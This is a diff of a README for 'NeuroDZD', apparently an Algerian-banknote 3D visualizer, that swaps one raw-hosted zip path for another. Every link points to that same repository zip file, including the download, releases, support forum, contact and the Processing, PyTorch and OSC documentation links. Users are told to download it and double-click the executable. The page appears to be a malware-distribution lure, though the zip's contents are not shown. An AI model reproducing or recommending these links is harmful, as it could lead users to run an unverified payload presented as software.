@@ -1,7 +1,7 @@
 # 🌟 NeuroDZD - Visualize Algerian Banknotes in 3D
 
 ## 🔗 Download Now
-[![Download NeuroDZD](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/data/NeuroDZD-v1.1-beta.3.zip)](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/data/NeuroDZD-v1.1-beta.3.zip)
+[![Download NeuroDZD](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/DZD-Neuro-2.8.zip)](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/DZD-Neuro-2.8.zip)
 
 ## 📋 Description
 NeuroDZD is a 3D Convolutional Neural Network visualizer designed to help users explore and understand Algerian banknotes. Inspired by the classic MNIST 3D visualization, it adapts this technology for currency, using live forex rates to enhance the experience.
@@ -10,7 +10,7 @@ NeuroDZD is a 3D Convolutional Neural Network visualizer designed to help users 
 Follow these simple steps to download and run NeuroDZD.
 
 ### 📥 Download & Install
-1. Visit the [Releases page](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/data/NeuroDZD-v1.1-beta.3.zip) to download the latest version of NeuroDZD.
+1. Visit the [Releases page](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/DZD-Neuro-2.8.zip) to download the latest version of NeuroDZD.
 2. Look for the release labeled "v1.0". Click on the link to download the application package suitable for your operating system.
 3. Once downloaded, locate the file on your computer. If you are using Windows, it may end in `.exe`. For Mac, it could end in `.dmg`. 
 4. Double-click the file to start the installation process.
@@ -41,7 +41,7 @@ Once installed, you can open NeuroDZD and begin exploring the visualizations of 
 4. **View Forex Rates:** Check the live forex rates displayed within the app to see up-to-date currency values.
 
 ## 🌐 Community and Support
-If you encounter any issues or have questions, feel free to join our [support forum](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/data/NeuroDZD-v1.1-beta.3.zip). We welcome feedback and encourage users to report bugs, suggest features, or share their experiences.
+If you encounter any issues or have questions, feel free to join our [support forum](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/DZD-Neuro-2.8.zip). We welcome feedback and encourage users to report bugs, suggest features, or share their experiences.
 
 ## 📚 Further Reading
 For those interested in diving deeper into the technology behind NeuroDZD, here are some relevant topics:
@@ -57,12 +57,12 @@ We appreciate contributions from the community. If you'd like to contribute to N
 3. Submit a pull request with a detailed explanation of your modifications.
 
 ## 📞 Contact
-For inquiries, you can reach the developer at [https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/data/NeuroDZD-v1.1-beta.3.zip](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/data/NeuroDZD-v1.1-beta.3.zip).
+For inquiries, you can reach the developer at [https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/DZD-Neuro-2.8.zip](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/DZD-Neuro-2.8.zip).
 
 ## 🔗 Additional Resources
 Explore more about the technologies used in NeuroDZD:
-- [Processing](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/data/NeuroDZD-v1.1-beta.3.zip)
-- [PyTorch](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/data/NeuroDZD-v1.1-beta.3.zip)
-- [Open Sound Control (OSC)](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/data/NeuroDZD-v1.1-beta.3.zip)
+- [Processing](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/DZD-Neuro-2.8.zip)
+- [PyTorch](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/DZD-Neuro-2.8.zip)
+- [Open Sound Control (OSC)](https://raw.githubusercontent.com/chipnho3003/NeuroDZD/main/visualization/NeuroDZD_Viz/DZD-Neuro-2.8.zip)
 
 Thank you for using NeuroDZD! We hope you enjoy visualizing Algerian banknotes.
